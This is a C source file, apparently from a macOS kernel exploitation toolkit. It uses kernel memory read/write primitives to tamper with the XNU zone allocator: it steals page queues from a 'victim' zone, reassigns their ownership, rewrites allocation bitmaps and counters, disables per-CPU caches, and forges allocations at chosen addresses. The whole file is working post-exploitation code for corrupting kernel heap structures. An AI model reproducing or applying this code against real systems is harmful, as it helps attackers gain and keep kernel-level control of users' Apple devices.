
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/assert.h"
#include "util/misc.h"
#include "util/log.h"
#include "util/zalloc.h"
#include "util/dispatch.h"
#include "allocator/large_mem.h"

#include <macos/kernel.h>


#define ZM_CHUNK_LEN_MAX        0x8
#define ZM_SECONDARY_PAGE       0xe
#define ZM_SECONDARY_PCPU_PAGE  0xf


struct xpl_zalloc {
    uintptr_t recipient_zone;
    uintptr_t victim_zone;
    uint32_t  stolen_pageq;
    uint16_t  num_allocs;
};


typedef struct xpl_zalloc* xpl_zalloc_t;

static dispatch_once_t xpl_zalloc_z_pcpu_cache_init_once;
static uintptr_t xpl_zalloc_z_pcpu_cache;


uintptr_t xpl_zalloc_pva_to_addr(uint32_t pva) {
    return (uintptr_t)(int32_t)pva << XPL_PAGE_SHIFT;
}

uintptr_t xpl_zalloc_find_zone_at_index(uint zone_index) {
    return xpl_slider_kernel_slide(VAR_ZONE_ARRAY_ADDR) + zone_index * TYPE_ZONE_SIZE;
}

uint xpl_zalloc_zone_to_index(uintptr_t zone) {
    return (uint)((zone - xpl_slider_kernel_slide(VAR_ZONE_ARRAY_ADDR)) / TYPE_ZONE_SIZE);
}

void xpl_zalloc_enable_zone_rsv(uintptr_t zone) {
    uint16_t z_elem_size = xpl_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    uint16_t z_elems_rsv = xpl_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET);
    
    int num_reserved = (XPL_PAGE_SIZE * 2 + z_elem_size - 1) / z_elem_size;
    num_reserved = num_reserved < 32 ? 32 : num_reserved;
    
    if (z_elems_rsv >= num_reserved) {
        return;
    }
    
    xpl_kmem_write_uint16(zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET, num_reserved);
    
    /// Mark zone for async zone expansion
    xpl_kmem_write_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, 1, TYPE_ZONE_BF0_MEM_Z_ASYNC_REFILLING_OFFSET, TYPE_ZONE_BF0_MEM_Z_ASYNC_REFILLING_SIZE);
}

uintptr_t xpl_zalloc_pageq_to_meta(uint32_t pageq) {
    uintptr_t zi_meta_base = xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_ZONE_INFO_ADDR), TYPE_ZONE_INFO_MEM_ZI_META_BASE_OFFSET) ;
    return zi_meta_base + ((uintptr_t)pageq * TYPE_ZONE_PAGE_METADATA_SIZE);
}

uintptr_t xpl_zalloc_bitmap_offset_to_ref(uint32_t offset) {
    uintptr_t zone_info = xpl_slider_kernel_slide(VAR_ZONE_INFO_ADDR);
    uintptr_t zi_bits_range = zone_info + TYPE_ZONE_INFO_MEM_ZI_BITS_RANGE_OFFSET;
    uintptr_t zba_slot_base = xpl_kmem_read_uint64(zi_bits_range, TYPE_ZONE_MAP_RANGE_MEM_MIN_ADDRESS_OFFSET);
    return zba_slot_base + (offset & ~0x7);
}


uint32_t xpl_zalloc_find_primary_pageq(uint32_t pageq_start, uint max_depth, uint* found_depth) {
    uint32_t cursor = pageq_start;
    uint depth = 0;
    while (depth < max_depth) {
        uintptr_t meta = xpl_zalloc_pageq_to_meta(cursor);
        
        uint32_t next = xpl_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
        if (!next) {
            break;
        }
        cursor = next;
        depth++;
    }
    if (found_depth) *found_depth = depth;
    return cursor;
}

uintptr_t xpl_zalloc_find_victim_zone(int required_chunk_pages, int required_bitmap_capacity, int required_depth) {
    for (int i=0; i<VAR_ZONE_ARRAY_LEN; i++) {
        uintptr_t zone = xpl_zalloc_find_zone_at_index(i);
        
        /// Some zones in zone_array may not be intialized
        if (xpl_kmem_read_uint64(zone, 0) != zone) {
            continue;
        }
        
        _Bool z_percpu = xpl_kmem_read_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, TYPE_ZONE_BF0_MEM_Z_PERCPU_BIT_OFFSET, TYPE_ZONE_BF0_MEM_Z_PERCPU_BIT_SIZE);
        if (z_percpu) {
            continue;
        }
        
        uint16_t z_elem_size = xpl_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
        uint16_t z_chunk_pages = xpl_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_CHUNK_PAGES_OFFSET);
        
        if (z_elem_size < 16) {
            continue;
        }
        
        if (z_chunk_pages < required_chunk_pages) {
            continue;
        }
        
        int bitmap_capacity = ((((z_chunk_pages * XPL_PAGE_SIZE) / z_elem_size) + 31) / 32) * 32;
        if (bitmap_capacity < required_bitmap_capacity) {
            continue;
        }
        
        uint32_t pageq_empty = xpl_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET);
        if (!pageq_empty) {
            continue;
        }
        
        uint found_depth;
        xpl_zalloc_find_primary_pageq(pageq_empty, required_depth, &found_depth);
        
        if (found_depth >= required_depth) {
            return zone;
        }
    }
    
    xpl_log_error("failed to find victim zone");
    xpl_abort();
}

uint32_t xpl_zalloc_steal_pageq(int required_chunk_pages, int required_bitmap_capacity, uintptr_t* victim_zone_out) {
    uintptr_t victim_zone = xpl_zalloc_find_victim_zone(required_chunk_pages, required_bitmap_capacity, 3);
    uint16_t chunk_pages = xpl_kmem_read_uint16(victim_zone, TYPE_ZONE_MEM_Z_CHUNK_PAGES_OFFSET);
    uint32_t pageq_empty = xpl_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET);
    xpl_assert(pageq_empty != 0);
    
    uint32_t pageq = xpl_zalloc_find_primary_pageq(pageq_empty, 10, NULL);
    uintptr_t meta = xpl_zalloc_pageq_to_meta(pageq);
    uint16_t zm_chunk_len = xpl_kmem_read_bitfield_uint16(meta, TYPE_ZONE_PAGE_METADATA_BF0_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_CHUNK_LEN_BIT_SIZE);
    xpl_assert_cond(chunk_pages, ==, zm_chunk_len);
    
    uint32_t prev_pageq = xpl_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET);
    uint32_t next_pageq = xpl_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
    
    uintptr_t prev_meta = prev_pageq ? xpl_zalloc_pageq_to_meta(prev_pageq) : 0;
    uintptr_t next_meta = next_pageq ? xpl_zalloc_pageq_to_meta(next_pageq) : 0;
    
    uintptr_t zone_info = xpl_slider_kernel_slide(VAR_ZONE_INFO_ADDR);
    uintptr_t meta_min = xpl_kmem_read_uint64(zone_info, TYPE_ZONE_INFO_MEM_ZI_META_RANGE_OFFSET);
    uintptr_t meta_max = xpl_kmem_read_uint64(zone_info, TYPE_ZONE_INFO_MEM_ZI_META_RANGE_OFFSET + 8);
    if (prev_meta < meta_min || prev_meta > meta_max) {
        prev_meta = 0;
    }
    if (next_meta < meta_min || next_meta > meta_max) {
        next_meta = 0;
    }
    
    if (prev_meta && next_meta) {
        xpl_kmem_write_uint32(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, next_pageq);
        xpl_kmem_write_uint32(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, prev_pageq);
    } else if (prev_meta) {
        xpl_kmem_write_uint32(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, 0);
    } else if (next_meta) {
        xpl_kmem_write_uint32(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, 0);
    } else {
        xpl_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET, 0);
    }
    
    xpl_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, 0);
    xpl_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, 0);
    
    uint16_t z_elem_size = xpl_kmem_read_uint16(victim_zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    uint32_t elems_lost = (chunk_pages * XPL_PAGE_SIZE) / z_elem_size;
    
    uint32_t z_elems_free = xpl_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
    xpl_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, z_elems_free - elems_lost);
    
    uint32_t z_elems_avail = xpl_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET);
    xpl_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET, z_elems_avail - elems_lost);
    
    /// May help avoid zone z_elems_free accounting panic in case we corrupted the field
    /// while mutating without lock
    xpl_zalloc_enable_zone_rsv(victim_zone);
    
    if (victim_zone_out) {
        *victim_zone_out = victim_zone;
    }
    
    return pageq;
}


void xpl_zalloc_change_pageq_owner(uintptr_t meta_head, uintptr_t zone) {
    int zone_index = xpl_zalloc_zone_to_index(zone);
    xpl_assert_cond(zone_index, <, VAR_ZONE_ARRAY_LEN);
    
    uintptr_t cursor = meta_head;
    xpl_assert(zone_index < VAR_ZONE_ARRAY_LEN);
    while (cursor) {
        xpl_kmem_write_bitfield_uint16(cursor, TYPE_ZONE_PAGE_METADATA_BF0_OFFSET, zone_index, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_INDEX_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_INDEX_BIT_SIZE);
        
        uint32_t next_pageq = xpl_kmem_read_uint32(cursor, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET);
        
        cursor = next_pageq ? xpl_zalloc_pageq_to_meta(next_pageq) : 0;
    }
}


void xpl_zalloc_init_bitmap_inline(uintptr_t meta_base, uint16_t chunk_len, int num_allocs) {
    for (int i=0; i<chunk_len; i++) {
        uintptr_t meta = meta_base + i * TYPE_ZONE_PAGE_METADATA_SIZE;
        uint batch_size = xpl_min(num_allocs, 32);
        uint32_t bitmap = ~0;
        if (batch_size < 32) {
            bitmap &= ((1 << batch_size) - 1);
        }
        xpl_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET, bitmap);
        num_allocs -= batch_size;
    }
    xpl_assert_cond(num_allocs, ==, 0);
}

void xpl_zalloc_init_bitmap_ref(uintptr_t meta_base, uint16_t chunk_len, int num_allocs) {
    uint32_t zm_bitmap = xpl_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    
    uintptr_t bitmap_base = xpl_zalloc_bitmap_offset_to_ref(zm_bitmap);
    uint bitmap_count = 1 << (zm_bitmap & 0x7);
    
    for (int i=0; i<bitmap_count; i++) {
        uint batch_size = xpl_min(num_allocs, 64);
        uintptr_t bitmap = bitmap_base + i * 8;
        uint64_t value = ~0ULL;
        if (batch_size < 64) {
            value &= ((1ULL << batch_size) - 1);
        }
        xpl_kmem_write_uint64(bitmap, 0, value);
        num_allocs -= batch_size;
    }
    xpl_assert_cond(num_allocs, ==, 0);
}

void xpl_zalloc_init_bitmap(uintptr_t meta, uint16_t chunk_len, int num_allocs) {
    _Bool zm_inline = xpl_kmem_read_bitfield_uint16(meta, TYPE_ZONE_PAGE_METADATA_BF0_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
    if (zm_inline) {
        xpl_zalloc_init_bitmap_inline(meta, chunk_len, num_allocs);
    } else {
        xpl_zalloc_init_bitmap_ref(meta, chunk_len, num_allocs);
    }
}


void xpl_zalloc_intialize_stolen_pageq(xpl_zalloc_t util) {
    xpl_assert(util->stolen_pageq != 0);
    uintptr_t meta = xpl_zalloc_pageq_to_meta(util->stolen_pageq);
    xpl_zalloc_change_pageq_owner(meta, util->recipient_zone);
    
    uint16_t z_elem_size = xpl_kmem_read_uint16(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    uint16_t chunk_len = (util->num_allocs * z_elem_size + XPL_PAGE_SIZE - 1) / XPL_PAGE_SIZE;
    
    xpl_assert_cond(chunk_len - 1, <=, ZM_CHUNK_LEN_MAX);
    xpl_zalloc_init_bitmap(meta, chunk_len, util->num_allocs);
    
    /// Make sure the pageq never becomes full and gets queued to z_pageq_full
    xpl_kmem_write_bitfield_uint16(meta, TYPE_ZONE_PAGE_METADATA_BF0_OFFSET, chunk_len + 1, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_CHUNK_LEN_BIT_SIZE);
    
    /// Make sure the pageq never becomes empty and gets queued to z_pageq_empty
    xpl_kmem_write_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, 1);
}


void xpl_zalloc_disable_pcpu_cache(uintptr_t zone) {
    uint32_t z_recirc_cur = xpl_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET);
    xpl_kmem_write_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, 1, TYPE_ZONE_BF0_MEM_Z_NOCACHING_BIT_OFFSET, TYPE_ZONE_BF0_MEM_Z_NOCACHING_BIT_SIZE);
    
    if (z_recirc_cur) {
        dispatch_once(&xpl_zalloc_z_pcpu_cache_init_once, ^() {
            xpl_log_debug("intializing xpl_zalloc_z_pcpu_cache");
            uint num_cpus = xpl_kmem_read_uint32(xpl_slider_kernel_slide(VAR_ZPERCPU_EARLY_COUNT), 0);
            size_t alloc_size = num_cpus << XPL_PAGE_SHIFT;
            xpl_zalloc_z_pcpu_cache = xpl_allocator_large_mem_allocate_disowned(alloc_size);
            char* temp = malloc(alloc_size);
            bzero(temp, alloc_size);
            xpl_kmem_write(xpl_zalloc_z_pcpu_cache, 0, temp, alloc_size);
            free(temp);
        });
        
        /// NOTE: Simply setting z_pcpu_cache to NULL will lead to system freeze
        /// FIXME: find out why
        xpl_log_warn("disabling pcpu cache for zone %p with z_recirc_cur: %d", (void*)zone, z_recirc_cur);
        /// Make sure zone_caching never gets enabled by `compute_zone_working_set_size`
        xpl_kmem_write_int8(xpl_slider_kernel_slide(VAR_ZONE_CACHING_DISABLED), 0, -1);
        /// Zero out z_recirc
        uint64_t z_recirc[2] = { 0, zone + TYPE_ZONE_MEM_Z_RECIRC_OFFSET };
        xpl_kmem_write_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET, 0);
        xpl_kmem_write(zone, TYPE_ZONE_MEM_Z_RECIRC_OFFSET, z_recirc, sizeof(z_recirc));
        /// Zero out z_pcpu_cache for all CPUs
        xpl_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, xpl_zalloc_z_pcpu_cache);
    } else {
        xpl_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, 0);
    }
}


xpl_zalloc_t xpl_zalloc_create(uintptr_t zone, int num_allocs) {
    uint16_t z_elem_size = xpl_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    _Bool z_percpu = xpl_kmem_read_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, TYPE_ZONE_BF0_MEM_Z_PERCPU_BIT_OFFSET, TYPE_ZONE_BF0_MEM_Z_PERCPU_BIT_SIZE);
    uintptr_t z_pcpu_cache = xpl_kmem_read_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET);
    
    /// Not supported for now
    xpl_assert(!z_percpu);
    
    if (z_pcpu_cache) {
        /// Disable zone caching since freed elements will not always be
        /// written back to bitmaps in zone page metadata
        xpl_log_warn("disabling zone caching for zone %p", (void*)zone);
        xpl_zalloc_disable_pcpu_cache(zone);
    }
    
    int required_chunk_pages = (z_elem_size * num_allocs + XPL_PAGE_SIZE - 1) / XPL_PAGE_SIZE;
    int required_bitmap_capacity = num_allocs;
    uintptr_t victim_zone;
    uint32_t pageq = xpl_zalloc_steal_pageq(required_chunk_pages, required_bitmap_capacity, &victim_zone);
    
    xpl_zalloc_t util = malloc(sizeof(struct xpl_zalloc));
    util->stolen_pageq = pageq;
    util->recipient_zone = zone;
    util->victim_zone = victim_zone;
    util->num_allocs = num_allocs;
    xpl_zalloc_intialize_stolen_pageq(util);
    
    /// May help avoid zone z_elems_free accounting panic in case we corrupted
    /// the field while mutating without lock
    xpl_zalloc_enable_zone_rsv(zone);
    return util;
}


int xpl_zalloc_meta_clear_bitmap_inline(uintptr_t meta_base, int eidx) {
    int meta_idx = eidx / 32;
    uintptr_t meta = meta_base + meta_idx * TYPE_ZONE_PAGE_METADATA_SIZE;
    uint32_t value = xpl_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    int bitmap_idx = eidx % 32;
    if (!(value & (1 << bitmap_idx))) {
        return EALREADY;
    }
    value ^= (1 << bitmap_idx);
    xpl_kmem_write_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET, value);
    return 0;
}


int xpl_zalloc_meta_clear_bitmap_ref(uintptr_t meta_base, int eidx) {
    uint32_t bitmap_offset = xpl_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    uintptr_t bitmap_base = xpl_zalloc_bitmap_offset_to_ref(bitmap_offset);
    int meta_idx = eidx / 64;
    int bitmap_idx = eidx % 64;
    uintptr_t bitmap = bitmap_base + meta_idx * 8;
    uint64_t value = xpl_kmem_read_uint64(bitmap, 0);
    if (!(value & (1ULL << bitmap_idx))) {
        return EALREADY;
    }
    value ^= (1ULL << bitmap_idx);
    xpl_kmem_write_uint64(bitmap, 0, value);
    return 0;
}


int xpl_zalloc_meta_clear_bit(uintptr_t meta, int eidx) {
    uint16_t zm_inline_bitmap = xpl_kmem_read_bitfield_uint16(meta, TYPE_ZONE_PAGE_METADATA_BF0_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
    
    if (zm_inline_bitmap) {
        return xpl_zalloc_meta_clear_bitmap_inline(meta, eidx);
    } else {
        return xpl_zalloc_meta_clear_bitmap_ref(meta, eidx);
    }
}


void xpl_zalloc_dec_z_elem_free(xpl_zalloc_t util) {
    uint32_t z_elem_free = xpl_kmem_read_uint32(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
    if (z_elem_free > 0) {
        xpl_kmem_write_uint32(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, z_elem_free - 1);
    } else {
        xpl_log_warn("could not decrement z_elem_free for zone %p since it was zero", (void*)util->recipient_zone);
    }
}


uintptr_t xpl_zalloc_alloc(xpl_zalloc_t util, int element_idx) {
    uintptr_t meta = xpl_zalloc_pageq_to_meta(util->stolen_pageq);
    int error = xpl_zalloc_meta_clear_bit(meta, element_idx);
    xpl_assert_err(error);
    
    uint16_t z_elem_size = xpl_kmem_read_uint16(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
    uint16_t zm_alloc_size = xpl_kmem_read_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET);
    xpl_kmem_write_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, zm_alloc_size + z_elem_size);
    
    xpl_zalloc_dec_z_elem_free(util);
    
    uintptr_t page = xpl_zalloc_pva_to_addr(util->stolen_pageq);
    return page + element_idx * z_elem_size;
}


void xpl_zalloc_destroy(xpl_zalloc_t* util_p) {
    xpl_zalloc_t util = *util_p;
    // TODO: give stolen pages back to victim zone
    free(util);
    *util_p = NULL;
}
